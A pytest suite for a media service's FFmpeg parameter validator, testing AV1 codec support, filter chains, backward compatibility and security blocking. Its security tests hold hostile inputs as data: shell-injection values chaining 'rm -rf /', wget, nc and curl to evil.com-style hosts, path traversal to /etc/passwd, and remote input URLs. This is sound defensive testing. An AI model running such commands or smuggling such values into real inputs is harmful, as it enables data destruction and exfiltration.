"""
Comprehensive test suite for enhanced FFmpeg validation system.

Tests the hybrid security architecture with:
1. Core parameter whitelist validation
2. Complex filter support (including user's AV1 examples)
3. Security violation detection and prevention
4. Backward compatibility with existing API

Author: Lorenzo Albanese (alblor)
"""

import pytest
import sys
import os

# Add the api directory to path for imports
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', 'api'))

from app.jobs import FFmpegValidator
from app.ffmpeg_validation_config import FFMPEG_CONFIG


class TestEnhancedFFmpegValidation:
    """Test enhanced FFmpeg validation system."""
    
    def setup_method(self):
        """Set up test fixtures."""
        self.validator = FFmpegValidator()
    
    # ===== USER'S REAL-WORLD EXAMPLES =====
    
    def test_user_av1_example_1(self):
        """Test the first AV1 example that should now be supported."""
        # Example: ffmpeg -i "INPUT.mkv" -vf "scale=-2:1440:flags=lanczos" 
        # -c:v libaom-av1 -crf 28 -b:v 0 -pix_fmt yuv420p10le
        # -row-mt 1 -cpu-used 3 -lag-in-frames 35 -g 240
        # -aom-params enable-tpl-model=1:aq-mode=1:deltaq-mode=1:enable-chroma-deltaq=1:arnr-maxframes=5:arnr-strength=2
        # -map 0 -map -0:d -c:s copy -c:a libopus -b:a 128k "OUTPUT_1440p_av1.mkv"
        
        params = [
            '-vf', 'scale=-2:1440:flags=lanczos',
            '-c:v', 'libaom-av1',
            '-crf', '28', 
            '-b:v', '0',
            '-pix_fmt', 'yuv420p10le',
            '-row-mt', '1',
            '-cpu-used', '3', 
            '-lag-in-frames', '35',
            '-g', '240',
            '-aom-params', 'enable-tpl-model=1:aq-mode=1:deltaq-mode=1:enable-chroma-deltaq=1:arnr-maxframes=5:arnr-strength=2',
            '-map', '0',
            '-map', '-0:d',
            '-c:s', 'copy',
            '-c:a', 'libopus',
            '-b:a', '128k'
        ]
        
        # This should now be valid (previously blocked due to missing AV1 support)
        result = self.validator.validate_parameters(params)
        assert result['valid'] == True
        assert len(result['violations']) == 0
        
        # Build command to ensure it constructs properly
        cmd = self.validator.build_command('input.mkv', 'output.mkv', result['safe_params'])
        assert 'libaom-av1' in cmd
        assert 'scale=-2:1440:flags=lanczos' in cmd
        
    def test_user_av1_example_2(self):
        """Test the second AV1 example with different audio codec."""
        params = [
            '-vf', 'scale=-2:1440:flags=lanczos',
            '-c:v', 'libaom-av1',
            '-crf', '28',
            '-b:v', '0', 
            '-pix_fmt', 'yuv420p10le',
            '-row-mt', '1',
            '-cpu-used', '3',
            '-lag-in-frames', '35',
            '-g', '240',
            '-aom-params', 'enable-tpl-model=1:aq-mode=1:deltaq-mode=1:enable-chroma-deltaq=1:arnr-maxframes=5:arnr-strength=2',
            '-map', '0',
            '-map', '-0:d',
            '-c:s', 'copy',
            '-c:a', 'aac',
            '-b:a', '160k',
            '-movflags', '+faststart'
        ]
        
        result = self.validator.validate_parameters(params)
        assert result['valid'] == True
        
    def test_user_svt_av1_example(self):
        """Test SVT-AV1 example that was previously blocked."""
        params = [
            '-vf', 'scale=-2:1440:flags=lanczos',
            '-c:v', 'libsvtav1',  # This codec was missing from original system
            '-crf', '28',
            '-preset', '6',
            '-pix_fmt', 'yuv420p10le',
            '-g', '240',
            '-svtav1-params', 'tune=0:enable-qm=1',  # Codec-specific params
            '-c:a', 'libopus',
            '-b:a', '128k'
        ]
        
        result = self.validator.validate_parameters(params)
        assert result['valid'] == True
        assert 'libsvtav1' in str(result['safe_params'])
        
    def test_user_preview_example(self):
        """Test preview generation example with time limits."""
        params = [
            '-ss', '00:10:00',
            '-t', '20',
            '-vf', 'scale=-2:1440:flags=lanczos,setsar=1',
            '-c:v', 'libaom-av1',
            '-crf', '30',
            '-b:v', '0',
            '-cpu-used', '5',
            '-row-mt', '1',
            '-an'  # No audio
        ]
        
        result = self.validator.validate_parameters(params)
        assert result['valid'] == True
    
    # ===== CODEC VALIDATION TESTS =====
    
    def test_av1_codec_support(self):
        """Test that all AV1 codecs are now supported."""
        av1_codecs = ['libaom-av1', 'librav1e', 'libsvtav1', 'av1_nvenc', 'av1_qsv', 'av1_amf']
        
        for codec in av1_codecs:
            validation = FFMPEG_CONFIG.validate_codec_value('video', codec)
            assert validation['valid'] == True, f"AV1 codec {codec} should be supported"
    
    def test_legacy_codec_support(self):
        """Test that existing codecs still work."""
        legacy_codecs = ['libx264', 'libx265', 'libvpx-vp9', 'copy']
        
        for codec in legacy_codecs:
            validation = FFMPEG_CONFIG.validate_codec_value('video', codec)
            assert validation['valid'] == True, f"Legacy codec {codec} should still be supported"
    
    def test_audio_codec_support(self):
        """Test comprehensive audio codec support."""
        audio_codecs = ['aac', 'libopus', 'libmp3lame', 'flac', 'alac', 'copy']
        
        for codec in audio_codecs:
            validation = FFMPEG_CONFIG.validate_codec_value('audio', codec)
            assert validation['valid'] == True, f"Audio codec {codec} should be supported"
    
    # ===== COMPLEX FILTER VALIDATION =====
    
    def test_complex_video_filters(self):
        """Test complex video filter chains."""
        complex_filters = [
            'scale=-2:1440:flags=lanczos',
            'scale=1920:1080:flags=bicubic,fps=30',
            'crop=1920:800:0:140,scale=1280:720',
            'unsharp=5:5:1.0:5:5:0.0',
            'eq=brightness=0.1:contrast=1.2:saturation=1.1'
        ]
        
        for filter_expr in complex_filters:
            params = ['-vf', filter_expr]
            result = self.validator.validate_parameters(params)
            assert result['valid'] == True, f"Filter '{filter_expr}' should be allowed"
    
    def test_complex_audio_filters(self):
        """Test complex audio filter support."""
        audio_filters = [
            'volume=0.8',
            'highpass=f=200',
            'lowpass=f=8000',
            'equalizer=f=1000:width_type=h:width=200:g=5'
        ]
        
        for filter_expr in audio_filters:
            params = ['-af', filter_expr]
            result = self.validator.validate_parameters(params)
            assert result['valid'] == True, f"Audio filter '{filter_expr}' should be allowed"
    
    # ===== SECURITY VIOLATION TESTS =====
    
    def test_shell_injection_blocked(self):
        """Test that shell injection attempts are blocked."""
        malicious_params = [
            ['-vf', 'scale=1920:1080; rm -rf /'],
            ['-c:v', 'libx264 && wget evil.com/malware'],
            ['-custom', '`rm -rf /tmp/*`'],
            ['-af', 'volume=0.5|nc evil.com 1337']
        ]
        
        for params in malicious_params:
            with pytest.raises(ValueError) as exc_info:
                self.validator.validate_parameters(params)
            assert 'VIOLATION' in str(exc_info.value)
    
    def test_path_traversal_blocked(self):
        """Test that path traversal attempts are blocked."""
        malicious_paths = [
            ['-vf', 'drawtext=textfile=../../../etc/passwd'],
            ['-i', '../../sensitive/file.mp4'],
            ['-f', 'concat:../../../etc/hosts']
        ]
        
        for params in malicious_paths:
            with pytest.raises(ValueError) as exc_info:
                self.validator.validate_parameters(params)
            assert 'VIOLATION' in str(exc_info.value)
    
    def test_network_access_blocked(self):
        """Test that network access attempts are blocked."""
        network_attempts = [
            ['-i', 'http://evil.com/payload.mp4'],
            ['-vf', 'movie=ftp://malicious.com/data.avi'],
            ['-f', 'rtmp://attack.server/stream']
        ]
        
        for params in network_attempts:
            with pytest.raises(ValueError) as exc_info:
                self.validator.validate_parameters(params) 
            assert 'VIOLATION' in str(exc_info.value)
    
    def test_system_command_blocked(self):
        """Test that system commands are blocked."""
        system_commands = [
            ['-vf', 'drawtext=text=test rm /tmp/file'],
            ['-custom', 'wget http://evil.com -O /tmp/malware'],
            ['-af', 'volume=1 curl -X POST evil.com']
        ]
        
        for params in system_commands:
            with pytest.raises(ValueError) as exc_info:
                self.validator.validate_parameters(params)
            assert 'VIOLATION' in str(exc_info.value)
    
    # ===== BACKWARD COMPATIBILITY TESTS =====
    
    def test_legacy_dict_format_support(self):
        """Test that legacy dictionary format still works."""
        legacy_params = {
            'video_codec': 'libx264',
            'audio_codec': 'aac',
            'custom_params': ['-crf', '23', '-preset', 'medium']
        }
        
        result = self.validator.validate_parameters(legacy_params)
        assert result['valid'] == True
        
        # Should be able to build command
        cmd = self.validator.build_command('input.mp4', 'output.mp4', result['safe_params'])
        assert 'libx264' in cmd
        assert 'aac' in cmd
        assert 'medium' in cmd
    
    def test_mixed_parameter_formats(self):
        """Test handling of mixed parameter formats.""" 
        # Dictionary with enhanced features
        params = {
            'video_codec': 'libaom-av1',  # Previously unsupported
            'audio_codec': 'libopus',
            'custom_params': ['-vf', 'scale=1920:1080:flags=lanczos', '-crf', '28']
        }
        
        result = self.validator.validate_parameters(params)
        assert result['valid'] == True
    
    # ===== OUTPUT FILENAME VALIDATION =====
    
    def test_safe_output_filenames(self):
        """Test that safe output filenames are accepted."""
        safe_filenames = [
            'output.mp4',
            'movie_1080p.mkv', 
            'audio_track.opus',
            'preview_av1.webm'
        ]
        
        for filename in safe_filenames:
            result = self.validator.validate_output_filename(filename)
            assert result == True
    
    def test_unsafe_output_filenames(self):
        """Test that unsafe output filenames are blocked."""
        unsafe_filenames = [
            '../../../etc/passwd',
            '/tmp/malicious.mp4',
            'C:\\Windows\\System32\\evil.exe',
            'file; rm -rf /',
            'output.mp4 && wget evil.com'
        ]
        
        for filename in unsafe_filenames:
            with pytest.raises(ValueError) as exc_info:
                self.validator.validate_output_filename(filename)
            assert 'VIOLATION' in str(exc_info.value)
    
    # ===== COMMAND CONSTRUCTION TESTS =====
    
    def test_safe_command_construction(self):
        """Test that commands are constructed safely (no shell injection)."""
        params = ['-c:v', 'libx264', '-crf', '23', '-c:a', 'aac']
        result = self.validator.validate_parameters(params)
        
        cmd = self.validator.build_command('input.mp4', 'output.mp4', result['safe_params'])
        
        # Should be a proper argument array (not shell string)
        assert isinstance(cmd, list)
        assert 'ffmpeg' in cmd[0]  # First element should be ffmpeg path
        assert '-i' in cmd
        assert 'input.mp4' in cmd
        assert 'output.mp4' in cmd
        assert 'libx264' in cmd
    
    def test_error_handling(self):
        """Test proper error handling and violation reporting."""
        malicious_params = ['-c:v', 'libx264; rm -rf /']
        
        with pytest.raises(ValueError) as exc_info:
            self.validator.validate_parameters(malicious_params)
        
        error_msg = str(exc_info.value)
        assert 'VIOLATION' in error_msg
        assert 'Shell metacharacters' in error_msg or 'security' in error_msg.lower()
    
    # ===== PERFORMANCE AND EDGE CASES =====
    
    def test_empty_parameters(self):
        """Test handling of empty parameters."""
        empty_cases = [[], {}, None, '']
        
        for case in empty_cases:
            if case is None or case == '':
                with pytest.raises(ValueError):
                    self.validator.validate_parameters(case)
            else:
                result = self.validator.validate_parameters(case)
                # Should handle gracefully
                assert isinstance(result, dict)
    
    def test_parameter_type_detection(self):
        """Test parameter type detection and validation."""
        # Test core parameter detection
        core_validation = FFMPEG_CONFIG.validate_core_parameter('-i')
        assert core_validation['valid'] == True
        assert core_validation['parameter_type'] == 'core_io'
        
        # Test video parameter detection
        video_validation = FFMPEG_CONFIG.validate_core_parameter('-c:v')
        assert video_validation['valid'] == True
        assert video_validation['parameter_type'] == 'video'
        
        # Test invalid parameter
        invalid_validation = FFMPEG_CONFIG.validate_core_parameter('-invalid_param')
        assert invalid_validation['valid'] == False
        assert invalid_validation['violation_type'] == 'invalid_parameter'


if __name__ == '__main__':
    # Run tests
    pytest.main([__file__, '-v'])